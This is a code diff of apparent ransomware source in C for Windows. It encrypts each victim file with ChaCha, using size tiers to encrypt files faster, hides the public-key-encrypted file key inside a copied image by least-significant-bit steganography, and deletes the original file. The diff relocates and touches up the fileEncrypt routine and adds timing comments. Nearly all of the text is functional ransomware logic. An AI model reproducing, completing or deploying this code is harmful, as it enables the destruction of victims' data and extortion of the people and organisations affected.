@@ -5,8 +5,6 @@ LPCSTR memePath;
 
 int extractResource() {
 	LPSTR lpTemp;
-	BYTE randomBuffer[16];
-	HANDLE tempFile;
 	DWORD dwSizeOfResource;
 	HMODULE hFile = NULL;
 	HRSRC hResource;
@@ -123,6 +121,7 @@ void cryptCleanUp() {
 }
 
 // Make sure key size is 256, nonce size is 8
+// anything less than 10mb. Encrypt full -> time from 0ms to 92ms
 int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
 
@@ -154,6 +153,7 @@ int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BY
 	return 0;
 }
 
+// 10mb to 100mb -> only encrypt half the files -> time from 45ms to 500ms
 int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
 	DWORD dwMaxLengthEncrypt = GetFileSize(hFileIn, NULL) / 2;
@@ -206,6 +206,7 @@ int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, co
 	return 0;
 }
 
+// anything above 100mb. Limit to 1.5 seconds
 int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
 	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
 	DWORD fileSize = GetFileSize(hFileIn, NULL);
@@ -291,67 +292,6 @@ DWORD getLengthString(LPCSTR oriFileName) {
 	return i;
 }
 
-int fileEncrypt(LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
-	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	DWORD fileSize = GetFileSize(inFile, NULL);
-	DWORD lenName = getLengthString((CHAR*)oriFileName);
-	HANDLE outFile = NULL;
-	CHAR* newFileName;
-	DWORD sizeFlag = 0;
-	if (inFile == INVALID_HANDLE_VALUE) {
-		return -1;
-	}
-	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);
-
-	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));
-
-	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
-
-	if (CopyFileA(memePath, newFileName, TRUE) == FALSE) {
-		goto CLEANUP;
-	}
-
-	if (fileSize > 10485760 && fileSize < 104857600) {
-		sizeFlag = 1;
-	}
-	else if (fileSize >= 104857600) {
-		sizeFlag = 2;
-	}
-	else {
-		sizeFlag = 0;
-	}
-	if (outFile == INVALID_HANDLE_VALUE) {
-		goto CLEANUP;
-	}
-	if (sizeFlag == 0) {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		chachaFileEncrypt(inFile, outFile, key, nonce);
-	}
-	else if (sizeFlag == 1) {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
-	}
-	else {
-		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
-	}
-
-	encryptKey(outFile, key, nonce);
-
-CLEANUP:
-	if (newFileName) {
-		free(newFileName);
-	}
-	if (inFile) {
-		CloseHandle(inFile);
-		DeleteFileA(oriFileName);
-	}
-	if (outFile) {
-		CloseHandle(outFile);
-	}
-}
-
-
 int encryptKey(HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
 	SetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
 	HCRYPTKEY publicKey;
@@ -395,7 +335,7 @@ int encryptKey(HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
 		goto CLEANUP;
 	}
 
-	for (int i = 0; i < dataLength; i++) {
+	for (DWORD i = 0; i < dataLength; i++) {
 		BYTE currentByte = keyBuffer[i];
 		for (int j = 0; j < 8; j++) {
 			imageBuffer[i * 8 + j] &= 0xFE;
@@ -421,3 +361,67 @@ CLEANUP:
 	}
 	return 0;
 }
+
+int fileEncrypt(LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
+	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD fileSize = GetFileSize(inFile, NULL);
+	DWORD lenName = getLengthString((CHAR*)oriFileName);
+	HANDLE outFile = NULL;
+	CHAR* newFileName;
+	DWORD sizeFlag = 0;
+	DWORD returnValue = -1;
+	if (inFile == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
+	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);
+
+	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));
+
+	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
+
+	if (CopyFileA(memePath, newFileName, TRUE) == FALSE) {
+		goto CLEANUP;
+	}
+
+	if (fileSize > 10485760 && fileSize < 104857600) {
+		sizeFlag = 1;
+	}
+	else if (fileSize >= 104857600) {
+		sizeFlag = 2;
+	}
+	else {
+		sizeFlag = 0;
+	}
+	if (outFile == INVALID_HANDLE_VALUE) {
+		goto CLEANUP;
+	}
+	if (sizeFlag == 0) {
+		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		chachaFileEncrypt(inFile, outFile, key, nonce);
+	}
+	else if (sizeFlag == 1) {
+		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
+	}
+	else {
+		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
+	}
+
+	encryptKey(outFile, key, nonce);
+	returnValue = 0;
+CLEANUP:
+	if (newFileName) {
+		free(newFileName);
+	}
+	if (inFile) {
+		CloseHandle(inFile);
+		DeleteFileA(oriFileName);
+	}
+	if (outFile) {
+		CloseHandle(outFile);
+	}
+	return returnValue;
+}
+
+
